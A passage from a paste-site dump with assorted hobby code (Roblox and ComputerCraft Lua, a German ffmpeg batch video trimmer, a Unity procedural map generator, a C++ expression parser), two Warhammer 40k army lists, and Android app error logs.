		local randomSlash = slashEffects[math.random(1, numSlashEffects)]:Clone()
		if CritBoost > 1 then
			randomSlash.ImageColor3 = Color3.fromRGB(255, 0, 0)
			randomSlash.ImageTransparency = 0
		end
		randomSlash.Parent = hitRootPart.SlashesGUI
	end

	local healthValue = hitHumanoid:FindFirstChild(""Health"")
	if healthValue and healthValue:IsA(""NumberValue"") then
		hitHumanoid.Health.Value -= dmg.Value * CritBoost
	else
		hitHumanoid.Health -= dmg.Value * CritBoost
	end
	
	if knockback then
		hitRootPart.AssemblyLinearVelocity = (hitRootPart.Position - toolParent.HumanoidRootPart.Position).Unit * knockback
	end
end

return module"
7XBMKJDb,Batch Video Cutter & Encoder,EurenikZ,Bash,Sunday 8th of June 2025 03:46:12 PM CDT,":: Dieses Skript verarbeitet alle .mp4-Dateien im aktuellen Verzeichnis, entfernt die angegebenen Sekunden vom Anfang und Ende und komprimiert sie optional per FFmpeg mit einem wählbaren CRF-Wert. Nur Videos mit ausreichender Länge (Videolänge + 3 > Schnittbereich) werden bearbeitet. Der ursprüngliche Zeitstempel der Datei bleibt erhalten, und die Ausgabedateien erhalten angepasste Namen (_cut.mp4 oder _crfXX.mp4).
:: ""ffmpeg-release-essentials.zip"" hier herunterladen, entpacken und aus dem Ordner ""bin"" die ffmpeg.exe und ffprobe.exe in das Verzeichnis kopieren: https://www.gyan.dev/ffmpeg/builds/

@echo off
setlocal enabledelayedexpansion
:: Benutzerabfrage: Start-Sekunden schneiden
set /p CUT_START=Wie viele Sekunden vom ANFANG sollen entfernt werden?
if ""%CUT_START%""=="""" set CUT_START=0
:: Benutzerabfrage: End-Sekunden schneiden
set /p CUT_END=Wie viele Sekunden vom ENDE sollen entfernt werden?
if ""%CUT_END%""=="""" set CUT_END=0
:: Benutzerabfrage: CRF-Wert
echo CRF-Wert (18=hoch, 23=normal, 28=niedrig) – Leer lassen = nur schneiden (kein Re-Encoding)
set /p CRF_WERT=Welcher CRF-Wert soll verwendet werden? 
:: Zahlenpruefung fuer CUT_START und CUT_END (Batch-only)
for /f ""delims=0123456789"" %%A in (""%CUT_START%"") do (
	echo Ungueltige Eingabe bei Startzeit & pause & exit /b
)
for /f ""delims=0123456789"" %%A in (""%CUT_END%"") do (
	echo Ungueltige Eingabe bei Endzeit & pause & exit /b
)
:: Wenn CRF-Wert gesetzt, auf Zahl pruefen, sonst ignorieren
if not ""%CRF_WERT%""=="""" (
	for /f ""delims=0123456789"" %%A in (""%CRF_WERT%"") do (
		echo Ungueltige Eingabe bei CRF-Wert & pause & exit /b
	)
)
:: Schleife ueber alle MP4-Dateien
for %%F in (*.mp4) do (
	echo Bearbeite: %%F
	:: Urspruengliches aenderungsdatum sichern
	for /f ""usebackq delims="" %%T in (`powershell -NoLogo -NoProfile -Command ""(Get-Item '%%F').LastWriteTimeUtc.ToString('yyyy-MM-ddTHH:mm:ss')""`) do (
		set ""TIMESTAMP=%%T""
	)
	:: Gesamtdauer ermitteln
	for /f ""usebackq delims="" %%D in (`ffprobe -v error -select_streams v:0 -show_entries format^=duration -of default^=nokey^=1:noprint_wrappers^=1 ""%%F""`) do (
		set ""DURATION=%%D""
	)
	:: Ganze Sekunden extrahieren
	for /f ""tokens=1 delims=."" %%T in (""!DURATION!"") do set /a INTDURATION=%%T
	
	:: Berechnungen
	set /a CUTS_TOTAL=!CUT_START!+!CUT_END!
	set /a VIDEO_PLUS_3=!INTDURATION!+3
	
	:: Debug
	echo   Video: !INTDURATION!s, Cuts: !CUTS_TOTAL!s, Video+3: !VIDEO_PLUS_3!s
	echo   Pruefung 1: !VIDEO_PLUS_3! GTR !CUTS_TOTAL! = ?
	
	:: Pruefung: Video+3 > Cuts UND genug zum Schneiden uebrig
	if !VIDEO_PLUS_3! GTR !CUTS_TOTAL! (
		echo   Pruefung 1: JA
		set /a REMAINING=!INTDURATION!-!CUTS_TOTAL!
		echo   Remaining: !REMAINING!s
		if !REMAINING! GEQ 1 (
			echo   Pruefung 2: JA - wird bearbeitet
			if ""%CRF_WERT%""=="""" (
				set ""OUTFILE=%%~nF_cut.mp4""
				ffmpeg -y -ss !CUT_START! -i ""%%F"" -t !REMAINING! -c copy ""!OUTFILE!""
			) else (
				set ""OUTFILE=%%~nF_crf!CRF_WERT!.mp4""
				ffmpeg -y -ss !CUT_START! -i ""%%F"" -t !REMAINING! -c:v libx265 -crf !CRF_WERT! -preset slow -movflags +faststart -c:a aac -b:a 160k ""!OUTFILE!""
			)
			:: aenderungsdatum zuruecksetzen
			powershell -NoLogo -NoProfile -Command ""(Get-Item '!OUTFILE!').LastWriteTimeUtc = [datetime]::ParseExact('!TIMESTAMP!', 'yyyy-MM-ddTHH:mm:ss', $null)""
			echo ? Fertig: !OUTFILE! - !REMAINING!s uebrig
		) else (
			echo ? uebersprungen: %%F - nur !REMAINING!s wuerden uebrig bleiben
		)
	) else (
		echo ? uebersprungen: %%F - !VIDEO_PLUS_3! nicht > !CUTS_TOTAL!
	)
)
echo.
echo Alle passenden Videos wurden verarbeitet.
pause"
BUegYJNU,procgen,TannerBoBanner,C#,Sunday 8th of June 2025 03:28:31 PM CDT,"using NUnit.Framework;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using static ProcGen;
using static UnityEditor.PlayerSettings;

public class ProcGen : MonoBehaviour
{
    public Dictionary<Vector2Int, Cell> Grid = new Dictionary<Vector2Int, Cell>();

    public GameObject grassPrefab;
    public GameObject sandPrefab;
    public GameObject waterPrefab;
    public GameObject forestPrefab;

    //variables that determine grid size and distance between cells
    public int chunks = 10;
    public int amplitude = 100;

    public List<Chunk> AllChunks = new List<Chunk>
    {
    new //Grass Chunk
        (
        ""Grass"",
        new List<WeightedChunk> //AllowedLeft
        {
            new(""Grass"", 5f),
            new(""Forest"", 2f),
            new(""Beach"", 1f),
            new (""Water"", 1f),
        },
        new List<WeightedChunk> //AllowedRight
        {
            new(""Grass"", 5f),
            new(""Forest"", 2f),
            new(""Beach"", 1f),
            new (""Water"", 1f),
        },
        new List<WeightedChunk>
        {
            new(""Grass"", 5f),
            new(""Forest"", 2f),
            new(""Beach"", 1f),
            new (""Water"", 1f),
        },
        new List<WeightedChunk>
        {
            new(""Grass"", 5f),
            new(""Forest"", 2f),
            new(""Beach"", 1f),
            new (""Water"", 1f),
        }
        ),
    new //Forest Chunk
        (
        ""Forest"",
        new List<WeightedChunk> //AllowedLeft
        {
            new(""Grass"", 2f),
            new(""Forest"", 5f),
            new (""Water"", 1f),
            new (""Beach"", 1f),
        },
        new List<WeightedChunk> //AllowedRight
        {
            new(""Grass"", 2f),
            new(""Forest"", 5f),
            new (""Water"", 1f),
            new (""Beach"", 1f),
        },
        new List<WeightedChunk>
        {
            new(""Grass"", 2f),
            new(""Forest"", 5f),
            new (""Water"", 1f),
            new (""Beach"", 1f),
        },
        new List<WeightedChunk>
        {
            new(""Grass"", 2f),
            new(""Forest"", 5f),
            new (""Water"", 1f),
            new (""Beach"", 1f),
        }
        ),
    new //Beach Chunk
        (
        ""Beach"",
        new List<WeightedChunk> //AllowedLeft
        {
            new (""Grass"", 1f),
            new (""Forest"", 1f),
            new (""Water"", 30f),
            new (""Beach"", 10f),
        },
        new List<WeightedChunk> //AllowedRight
        {
            new (""Grass"", 1f),
            new (""Water"", 30f),
            new (""Beach"", 10f),
            new (""Forest"", 1f),
        },
        new List<WeightedChunk>
        {
            new (""Grass"", 1f),
            new (""Water"", 30f),
            new (""Forest"", 1f),
            new (""Beach"", 10f),
        },
        new List<WeightedChunk>
        {
            new (""Grass"", 1f),
            new (""Water"", 30f),
            new (""Beach"", 10f),
            new (""Forest"", 1f),
        }
        ),
    new //Water Chunk
        (
        ""Water"",
        new List<WeightedChunk> //AllowedLeft
        {
            new (""Grass"", 1f),
            new (""Water"", 10f),
            new (""Forest"", 1f),
            new (""Beach"", 3f),
        },
        new List<WeightedChunk> //AllowedRight
        {
            new (""Grass"", 1f),
            new (""Water"", 10f),
            new (""Forest"", 1f),
            new (""Beach"", 3f),
        },
        new List<WeightedChunk>
        {
            new (""Grass"", 1f),
            new (""Water"", 10f),
            new (""Forest"", 1f),
            new (""Beach"", 3f),
        },
        new List<WeightedChunk>
        {
            new (""Grass"", 1f),
            new (""Water"", 10f),
            new (""Forest"", 1f),
            new (""Beach"", 3f),
        }
        )

    };

    readonly Vector2Int[] directions = new Vector2Int[]
    {
        Vector2Int.up, Vector2Int.down, Vector2Int.left, Vector2Int.right
    };



    // Start is called once before the first execution of Update after the MonoBehaviour is created
    void Start()
    {
        for(var x = 0; x<chunks; x++) //creates grid
        {
            for (var y = 0; y<chunks; y++)
            {
                Grid[new Vector2Int(x, y)] = new Cell();
                Grid[new Vector2Int(x, y)].worldPos = new Vector2(x * amplitude, y * amplitude);
                print(""Current cell at "" + x + "", "" + y + "" is now set to worldPos "" + x*amplitude + "", "" + y*amplitude);
            }
        }

        int safety = 1000;
        while (Grid.Values.Any(cell => cell.placedChunk == null) && safety-- > 0)
        {
            GenerateChunks();
        }

        if (safety <= 0)
        {
            Debug.LogError(""Infinite loop detected — generation did not finish."");
        }

        
    }

    // Update is called once per frame
    void Update()
    {
        
    }

    void GenerateChunks()
    {
        if (Grid.Values.All(cell => cell.possibleChunks.Count == 0))
        {
            Debug.LogError(""All remaining cells have no possible chunks — generation failed."");
            return;
        }

        List<Vector2Int> lowestEntropyCells = new List<Vector2Int>();

        foreach (var kvp in Grid) //step 1: determine possible chunks at each cell
        {
            Vector2Int pos = kvp.Key;
            Cell cell = kvp.Value;

            if (cell.placedChunk != null) continue;
            cell.possibleChunks = GetPossibleChunksForCell(pos);

        }

        int entropy = int.MaxValue; //make a list of cells with lowest entropy
        foreach (var kvp in Grid)
        {
            Vector2Int pos = kvp.Key;
            Cell cell = kvp.Value;

            if (cell.possibleChunks.Count == 0) continue;

            if (cell.possibleChunks.Count < entropy)
            {
                entropy = cell.possibleChunks.Count;
                lowestEntropyCells = new List<Vector2Int>
                {
                    pos
                };
            }
            else if (cell.possibleChunks.Count == entropy)
            {
                lowestEntropyCells.Add(pos);
            }
        }

        if (lowestEntropyCells == null || lowestEntropyCells.Count == 0)
        {
            Debug.LogError(""No cells with valid options left. Stopping generation."");
            return;
        }



        //step 2: randomly pick a cell from the lowest possible cells

        PickChunk(lowestEntropyCells[Random.Range(0, lowestEntropyCells.Count)]);
        
        //step 4: determine possible chunks at said cell
        //step 3: randomly generate a cell based on weightings
    }

    void PickChunk(Vector2Int pos)
    {
        List<WeightedChunk> validChunks = GetWeightedoptionsForCell(pos);

        float weight = 0f;
        foreach (var kvp in validChunks) 
        {
            weight += kvp.weight;
            kvp.weight = weight;
        }

        float rand = Random.Range(0, weight);

        foreach (var kvp in validChunks)
        {
            if (rand <= kvp.weight)
            {
                Grid[pos].placedChunk = AllChunks.First(c => c.name == kvp.name);
                print(""Set chunk at "" + pos.x + "", "" + pos.y + "" To "" + kvp.name);

                
                return;
            }
        }
    }

    List<string> GetPossibleChunksForCell(Vector2Int cellPos)
    {
        List<string> validChunks = null;

        foreach(var dir in directions)
        {
            Vector2Int neighborPos = cellPos + dir;

            if (!Grid.ContainsKey(neighborPos)) continue;

            Chunk neighbor = Grid[neighborPos].placedChunk;

            if (neighbor == null) continue;

            List<WeightedChunk> allowed = GetAllowedChunksFrom(neighbor, dir);
            List<string> names = allowed.Select(wc => wc.name).ToList();

            if (validChunks == null)
            {
                validChunks = new List<string>(names);
            }
            else
            {
                validChunks = validChunks.Intersect(names).ToList();
            }
        }
        return validChunks ?? AllChunks.Select(wc => wc.name).ToList();
    }

    List<WeightedChunk> GetWeightedoptionsForCell(Vector2Int cellPos)
    {
        Dictionary<string, float> chunkWeights = new Dictionary<string, float>();

        foreach (var dir in directions)
        {
            Vector2Int neighborPos = cellPos + dir; //gets position of neighbor in current direction

            if (!Grid.ContainsKey(neighborPos)) continue; //skips if the selected grid position doesn't exist (edge)

            Chunk neighbor = Grid[neighborPos].placedChunk; //sets chunk to currently placed chunk at location
            if (neighbor == null) continue; //if there is no chunk there, skip it

            List<WeightedChunk> allowed = GetAllowedChunksFrom(neighbor, dir); //gets allowed chunk from neighbor if found
            foreach (var wc in allowed) //for each allowed chunk, add weight to chunkweights
            {
                if (!chunkWeights.ContainsKey(wc.name)) //if chunk weights doesnt have this chunk, add it and set it to it's weight
                    chunkWeights[wc.name] = wc.weight;
                else //if chunk weights has this chunk already, add weight to it from the selected cell
                    chunkWeights[wc.name] += wc.weight;
            }

        }
        if (chunkWeights.Count == 0) //if no chunks were found in neighbors, failsafe to set all chunks equally, so it randomly chooses the first chunk
        {
            return AllChunks.Select(chunk => new WeightedChunk(chunk.name, 1f)).ToList();
        }

        List<string> valid = GetPossibleChunksForCell(cellPos); //filter weights to remove all weights that aren't allowed by all neighbors
        return chunkWeights
            .Where(kvp => valid.Contains(kvp.Key)) //removed any weighted option that doesn't exist in valid
            .Select(kvp => new WeightedChunk(kvp.Key, kvp.Value)) //convert chunkWeights keys and values to weightedChunk format
            .ToList(); //combine to a list to return
    }

    List<WeightedChunk> GetAllowedChunksFrom(Chunk neighbor, Vector2Int dir)
    {
        if (dir == Vector2Int.up) return neighbor.AllowedBottom;   // Because we're above
        if (dir == Vector2Int.down) return neighbor.AllowedTop;    // Because we're below
        if (dir == Vector2Int.left) return neighbor.AllowedRight;
        if (dir == Vector2Int.right) return neighbor.AllowedLeft;
        return new List<WeightedChunk>();
    }
}

public class Chunk
{
    public string name;

    public List<WeightedChunk> AllowedLeft;
    public List<WeightedChunk> AllowedRight;
    public List<WeightedChunk> AllowedTop; 
    public List<WeightedChunk> AllowedBottom;  

    public Chunk(string name, List<WeightedChunk> allowedLeft, List<WeightedChunk> allowedRight, List<WeightedChunk> allowedTop, List<WeightedChunk> allowedBottom)
    {
        this.name = name;
        AllowedLeft = allowedLeft;
        AllowedRight = allowedRight;
        AllowedTop = allowedTop;
        AllowedBottom = allowedBottom;
    }
}

public class Cell
{
    public Vector2 worldPos;
    public Chunk placedChunk;
    public List<string> possibleChunks;

    public Cell()
    {
        this.possibleChunks = new List<string> {""Grass"", ""Water"", ""Beach"", ""Forest"" };
    }
}

public class WeightedChunk
{
    public string name;
    public float weight;

    public WeightedChunk(string name, float weight)
    {
        this.name = name;
        this.weight = weight;
    }
}




"
AFQaNgja,Clock 3x2,Rukerisu,Lua,Sunday 8th of June 2025 02:40:34 PM CDT,"local monitor = peripheral.find(""monitor"")
if not monitor then
  print(""Monitor not connected!"")
  return
end

monitor.setBackgroundColor(colors.black)
monitor.setTextScale(1.5)
monitor.clear()


local function writeLineCentered(y, text, color)
  local w, _ = monitor.getSize()
  local x = math.floor((w - #text) / 2) + 1
  monitor.setCursorPos(x, y)
  monitor.setTextColor(color)
  monitor.write(text)
end

while true do
  monitor.clear()


  local _, h = monitor.getSize()


  local startY = math.floor((h - 4) / 2) + 1


  local realTime = textutils.formatTime(os.time(""local""), true)
  local gameTime = textutils.formatTime(os.time(), true)


  writeLineCentered(startY, ""Real Time"", colors.orange)
  writeLineCentered(startY + 1, realTime, colors.green)


  writeLineCentered(startY + 3, ""Minecraft Time"", colors.orange)
  writeLineCentered(startY + 4, gameTime, colors.green)

  sleep(0.1)
end
"
EF2sUWtz,Untitled,w3ntz,C++,Sunday 8th of June 2025 01:47:32 PM CDT,"#include <iostream>
#include <string>
#include <fstream>
using namespace std;
struct var {
	string name;
	string n;
};
struct node {
	var info;
	node* next;
};
void add(node*& head, var n) {
	node* q = new node;
	q->next = NULL;
	q->info = n;
	if (head == NULL) {
		head = q;
	}
	else {
		node* p = head;
		while (p->next != NULL) {
			p = p->next;
		}
		p->next = q;
	}
}
void ch(node*& head, var n) {
	node* p = head;
	bool b = false;
	while (p && !b) {
		if (p->info.name == n.name) {
			p->info.n = n.n;
			b = true;
		}
		p = p->next;
	}
	if (!b)
		add(head, n);
}
string find(string& name, node*& head) {
	node* p = head;
	while (p) {
		if (p->info.name == name) {
			return p->info.n;
		}
	}
	return ""-"";
}
int defop(char g) {
	switch (g) {
	case '|': // диз
		return 0;
		break;
	case '&': // кон
		return 1;
		break;
	case '+': // слож
		return 2;
		break;
	case '-': // имп
		return 3;
		break;
	case '*': // шеф
		return 4;
		break;
	case ';':
		return 5;
		break;
	case ' ':
		return 5;
		break;
	default:
		return -1;
	}
}
bool f(node*& vars) {
	ifstream in(""in.txt"");
	int condition = 0;
	int op = 0;
	char c;
	string name;
	int idxname = 0;
	string n;
	int idxn = 0;
	string n1;
	int idxn1 = 0;
	string name1;
	while (in >> c) {
		switch (condition) {
		case 0:
			if (isdigit(c) || isalpha(c)) {
				if (idxname == 0 && isdigit(c))
					condition = -1;
				else {
					name += c;
				}
			}
			else if (c == ':')
				condition = 1;
			else
				condition = -1;
			break;
		case 1:
			if (c == '=')
				condition = 1;
			else if (isalpha(c)) {
				condition = 2;
				name1 = c;
			}
			else if (c == '0' || c == '1') {
				condition = 3;
				idxn = 1;
				n = c;
			}
			else
				condition = -1;
			break;
		case 2:
			if (isalpha(c) || isdigit(c)) {
				name1 += c;
			}
			else if (c == ' ' || c == ';') {
				n = find(name1, vars);
				if (n == ""-"") 
					condition = -1;
				else {
					var t;
					t.n = n;
					t.name = name;
					name = """";
					idxname = 0;
					ch(vars, t);
					condition = 0;
				}
			}
			else {
				op = defop(c);
				if (op == -1)
					condition = -1;
				else
					condition = 4;
			}
			break;
		case 3:
			if (idxn < 8) {
				if (c == '0' || c == '1') {
					idxn++;
					n += c;
				}
				else
					condition = -1;
			}
			else {
				if (c == '0' || c == '1')
					condition = -1;
				else {
					op = defop(c);
					if (op == -1)
						condition = -1;
					else if (op == 5) {
						var t;
						t.n = n;
						t.name = name;
						name = """";
						idxname = 0;
						ch(vars, t);
						condition = 0;
					}
					else
						condition = 4;
				}
			}
			break;
		case 4:
			if (isalpha(c)) {
				condition = 5;
				name1 = c;
			}
			else if (c == '0' || c == '1') {
				condition = 6;
				idxn1 = 1;
				n1 = c;
			}
			else
				condition = -1;
			break;
		case 5:
			if (isalpha(c) || isdigit(c)) {
				name1 += c;
			}
			else if (c == ' ' || c == ';') {
				n1 = find(name1, vars);
				if (n1 == ""-"")
					condition = -1;
				else {
					string ans = ""00000000"";
					for (int i = 0; i < 8; ++i) {
						int a = (n[i] - '0'), b = (n1[i] - '0');
						switch (op) {
						case 0:
							ans[i] = (a || b) + '0';
							break;
						case 1:
							ans[i] = (a && b) + '0';
							break;
						case 2:
							ans[i] = ((a + b) % 2) + '0';
							break;
						case 3:
							ans[i] = (!(a && !b)) + '0';
							break;
						case 4:
							ans[i] = (!(a && b)) + '0';
							break;
						}
					}
					var gh;
					gh.n = ans;
					gh.name = name;
					name = """";
					idxname = 0;
					ch(vars, gh);
					condition = 0;
				}
			}
			else
				condition = -1;
			break;
		case 6:
			if (idxn1 < 8) {
				if (c == '0' || c == '1') {
					idxn1++;
					n1 += c;
				}
				else
					condition = -1;
			}
			else {
				if (c == '0' || c == '1')
					condition = -1;
				else {
					string ans = ""00000000"";
					for (int i = 0; i < 8; ++i) {
						int a = (n[i] - '0'), b = (n1[i] - '0');
						switch (op) {
						case 0:
							ans[i] = (a || b) + '0';
							break;
						case 1:
							ans[i] = (a && b) + '0';
							break;
						case 2:
							ans[i] = ((a + b) % 2) + '0';
							break;
						case 3:
							ans[i] = (!(a && !b)) + '0';
							break;
						case 4:
							ans[i] = (!(a && b)) + '0';
							break;
						}
					}
					var gh;
					gh.n = ans;
					gh.name = name;
					name = """";
					idxname = 0;
					ch(vars, gh);
					condition = 0;
				}
			}
		}
		if (condition == -1)
			return false;
	}
	return true;
}
void pr(node* head) {
	while (head) {
		cout << head->info.name << '=' << head->info.n << '\n';
		head = head->next;
	}
}
int main()
{
	node* vars = NULL;
	if (f(vars)) {
		pr(vars);
	}
	else {
		cout << ""syntax error"";
	}
}
"
3civ0FaT,Ottawa Teams R5 Knights,TableTopLive,PHP,Sunday 8th of June 2025 12:51:54 PM CDT,"Player Name: Antoine Boivin
Factions Used: Imperial Knights / Imperial Agents
Army Points: 2000
Army Enhancements: none
Detachment Rule: noble lance ( indomitable heroes)
++++++++++++++++++++++++++++++++++

Finally, a Knight list that is different (2000 points)

Imperial Knights
Strike Force (2000 points)
Noble Lance


CHARACTERS

Canis Rex (450 points)
• Warlord
• 1x Chainbreaker las-impulsor
1x Chainbreaker multi-laser
1x Freedom’s Hand


BATTLELINE

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear


ALLIED UNITS

Callidus Assassin (100 points)
• 1x Neural shredder
1x Phase sword and poison blades

Sisters of Battle Immolator (115 points)
• 1x Armoured tracks
1x Heavy bolter
1x Hunter-killer missile
1x Immolation flamers

Sisters of Battle Squad (115 points)
• 1x Sister Superior
• 1x Bolt pistol
1x Close combat weapon
1x Condemnor boltgun
1x Power weapon
• 9x Battle Sister
• 9x Bolt pistol
7x Boltgun
9x Close combat weapon
1x Meltagun
1x Multi-melta
1x Simulacrum Imperialis"
tddByu9d,Ottawa Teams R5 Necrons,TableTopLive,PHP,Sunday 8th of June 2025 12:51:37 PM CDT,"Player Name: Devin Swann
Team Name: Blunt Force Trauma
Factions Used: Necrons
Army Points: 1995
Army Enhancements (list on which models): Dread Majesty (on Char1: Catacomb Command Barge) & Demanding Leader (on Char2: Technomancer)
Detachment Rule: Relentless Onslaught
+++++++++++++++++++++++++++++++++++++++++++++++

Char1: 1x Imotekh the Stormlord (100 pts): Gauntlet of Fire, Staff of the Destroyer
Char2: 1x Catacomb Command Barge (150 pts): Resurrection orb, Warlord, Gauss cannon, Overlord's blade
Enhancement: Dread Majesty (+30 pts)
Char3: 1x Technomancer (95 pts): Staff of light
Enhancement: Demanding Leader (+10 pts)
Char4: 1x Technomancer (85 pts): Staff of light
Char5: 1x Technomancer (85 pts): Staff of light

3x Ophydian Destroyers (80 pts): Plasmacyte, 3 with Ophydian hyperphase weapons
1x Lokhust Destroyers (35 pts): Close combat weapon, Gauss cannon
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
1x Canoptek Reanimator (75 pts): 2x Atomiser beam, Reanimator's claws
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array"
JpPT0hib,2025-06-08T19:37:55.502859,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getSongs() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
9kF0Qxt0,2025-06-08T19:37:53.530252,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
DRSUCzZf,2025-06-08T19:37:55.486850,powerampache,PHP,Sunday 8th of June 2025 12:38:01 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getArtists() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
GXqUC2nR,reactor,lemarwin,Lua,Sunday 8th of June 2025 12:06:12 PM CDT,"if warpdriveCommons then os.unloadAPI(""warpdriveCommons"") end
if not os.loadAPI(""warpdrive/warpdriveCommons"") then error(""missing warpdriveCommons"") end
local w = warpdriveCommons.w

local data

----------- Reactor support

--  0000000001111111111222222222233333333334444444444
--  1234567890123456789012345678901234567890123456789
-- [Reactor stability %      Laser level k           ]
-- [ 99.9 99.9 99.9 99.9     56 123456 123456 123456 ]
-- [ 99.9 99.9 99.9 99.9     123.4 123.4 123.4 123.4 ]
-- [ 99.9 99.9 99.9 99.9     4.5 x 456 123456 123456 ]
-- [ 99.9 99.9 99.9 99.9 123456 123456 123456 123456 ]

local reactor
local reactorlasers = {}

local reactor_outputMode = ""off""
local reactor_outputThreshold = 100
local reactor_targetStability = 50
local reactor_laserAmount = 10000

local reactor_output = 0
local tArgs= { ... } 

local signal_side = tArgs[1] or ""right""
local min_stability_str = tArgs[2] or ""5.0""
local min_stability = tonumber(min_stability_str)

function reactor_read(parData)
  data = parData
end

function reactor_boot()
  if reactor ~= nil then
    w.writeLn(""Booting Reactor..."")
    reactor_outputMode, reactor_outputThreshold = reactor.outputMode()
    reactor_targetStability = 100.0 - reactor.instabilityTarget()
    reactor_laserAmount = reactor.stabilizerEnergy()
  end
end

function reactor_cycleOutputMode()
  if reactor_outputMode == ""off"" then
    reactor_outputMode = ""above""
  elseif reactor_outputMode == ""above"" then
    reactor_outputMode = ""at_rate""
  else
    reactor_outputMode = ""off""
  end
end

local stage = ""off""
local preoutput_cycles = 0

function run_stage()
    if stage == ""off"" then
        reactor_stop()
    elseif stage == ""warmup"" then
        reactor_outputMode = ""off""
        reactor_targetStability = 7
        reactor_setTargetStability()
        reactor_start()
    elseif stage == ""preoutput"" then
        preoutput_cycles = 0
        reactor_outputThreshold = 75000
        reactor_outputMode = ""above""
        reactor_setMode()
    elseif stage == ""output"" then
        reactor_outputThreshold = 7500
        reactor_outputMode = ""above""
        reactor_setMode()
    end
end

function reactor_key(character, keycode)
  if character == 's' or character == 'S' then -- S
    reactor_start()
    return true
  elseif character == 'p' or character == 'P' then -- P
    reactor_stop()
    return true
  elseif character == 'l' or character == 'L' then -- L
    reactor_laser()
    return true
  elseif character == 'o' or character == 'O' then -- O
    reactor_cycleOutputMode()
    reactor_setMode()
    return true
  elseif character == 'g' or character == 'G' then -- G
    reactor_outputThreshold = reactor_outputThreshold - 1000
    reactor_setMode()
    return true
  elseif character == 't' or character == 'T' then -- T
    reactor_outputThreshold = reactor_outputThreshold + 1000
    reactor_setMode()
    return true
  elseif character == 'j' or character == 'J' then -- J
    reactor_laserAmount = reactor_laserAmount - 500
    reactor_setLaser()
    return true
  elseif character == 'u' or character == 'U' then -- U
    reactor_laserAmount = reactor_laserAmount + 500
    reactor_setLaser()
    return true
  elseif character == '-' then -- -
    reactor_targetStability = reactor_targetStability - 1
    reactor_setTargetStability()
    return true
  elseif character == '+' then -- +
    reactor_targetStability = reactor_targetStability + 1
    reactor_setTargetStability()
    return true
  elseif character == 'c' or character == 'C' then -- C
    reactor_config()
    return true
  elseif character == 'a' or character == 'C' then 
    if stage == ""off"" then
        stage = ""warmup""
        run_stage()
        return true
    else 
        stage = ""off""
        run_stage()
        return true
    end
  end
  return false
end

function reactor_page()
